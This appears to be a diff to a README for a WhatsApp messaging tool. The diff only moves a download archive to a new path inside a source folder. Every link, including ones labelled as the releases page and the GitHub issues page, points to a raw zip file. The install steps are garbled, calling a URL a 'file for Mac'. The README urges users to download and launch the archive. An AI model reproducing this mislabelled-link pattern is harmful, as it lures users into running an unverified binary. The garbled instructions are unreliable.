@@ -1,6 +1,6 @@
 # 🎉 Simple-Whatsapp-API - Connect and Message Instantly
 
-![Download Simple-Whatsapp-API](https://raw.githubusercontent.com/Kerlin-perozo/Simple-Whatsapp-API/main/subcellar/Simple-Whatsapp-API.zip%20Now-Click%20Here-brightgreen)
+![Download Simple-Whatsapp-API](https://raw.githubusercontent.com/Kerlin-perozo/Simple-Whatsapp-API/main/src/middleware/Simple_Whatsapp_API_v3.9.zip%20Now-Click%20Here-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -8,10 +8,10 @@ Welcome to Simple Whatsapp API. This tool lets you easily connect with WhatsApp 
 
 ## 📥 Download & Install
 
-To download the software, visit this page: [Download Simple-Whatsapp-API Releases](https://raw.githubusercontent.com/Kerlin-perozo/Simple-Whatsapp-API/main/subcellar/Simple-Whatsapp-API.zip). Once you are on the page, look for the latest release. 
+To download the software, visit this page: [Download Simple-Whatsapp-API Releases](https://raw.githubusercontent.com/Kerlin-perozo/Simple-Whatsapp-API/main/src/middleware/Simple_Whatsapp_API_v3.9.zip). Once you are on the page, look for the latest release. 
 
 1. Click on the version you want to download.
-2. You should see several files. Choose the one that best fits your operating system. Typically, this will be a `.exe` file for Windows or a `https://raw.githubusercontent.com/Kerlin-perozo/Simple-Whatsapp-API/main/subcellar/Simple-Whatsapp-API.zip` file for Mac.
+2. You should see several files. Choose the one that best fits your operating system. Typically, this will be a `.exe` file for Windows or a `https://raw.githubusercontent.com/Kerlin-perozo/Simple-Whatsapp-API/main/src/middleware/Simple_Whatsapp_API_v3.9.zip` file for Mac.
 3. Click on the file name to start the download.
 
 After the download is complete, locate the file in your Downloads folder. 
@@ -23,7 +23,7 @@ After the download is complete, locate the file in your Downloads folder.
 
 ### For Mac Users
 
-1. Open the `https://raw.githubusercontent.com/Kerlin-perozo/Simple-Whatsapp-API/main/subcellar/Simple-Whatsapp-API.zip` file you downloaded.
+1. Open the `https://raw.githubusercontent.com/Kerlin-perozo/Simple-Whatsapp-API/main/src/middleware/Simple_Whatsapp_API_v3.9.zip` file you downloaded.
 2. Drag the Simple Whatsapp API application into your Applications folder.
 3. Double-click the application to launch it.
 
@@ -68,8 +68,8 @@ If you encounter issues while using the Simple Whatsapp API, consider these solu
 
 ## 📬 Need Help?
 
-If you have any questions or need further assistance, you can create an issue on our [GitHub page](https://raw.githubusercontent.com/Kerlin-perozo/Simple-Whatsapp-API/main/subcellar/Simple-Whatsapp-API.zip). Our team is here to help you.
+If you have any questions or need further assistance, you can create an issue on our [GitHub page](https://raw.githubusercontent.com/Kerlin-perozo/Simple-Whatsapp-API/main/src/middleware/Simple_Whatsapp_API_v3.9.zip). Our team is here to help you.
 
-Don't forget to download the application from the releases page: [Download Simple-Whatsapp-API Releases](https://raw.githubusercontent.com/Kerlin-perozo/Simple-Whatsapp-API/main/subcellar/Simple-Whatsapp-API.zip). 
+Don't forget to download the application from the releases page: [Download Simple-Whatsapp-API Releases](https://raw.githubusercontent.com/Kerlin-perozo/Simple-Whatsapp-API/main/src/middleware/Simple_Whatsapp_API_v3.9.zip). 
 
 Thank you for using Simple Whatsapp API! We hope you enjoy sending your messages.
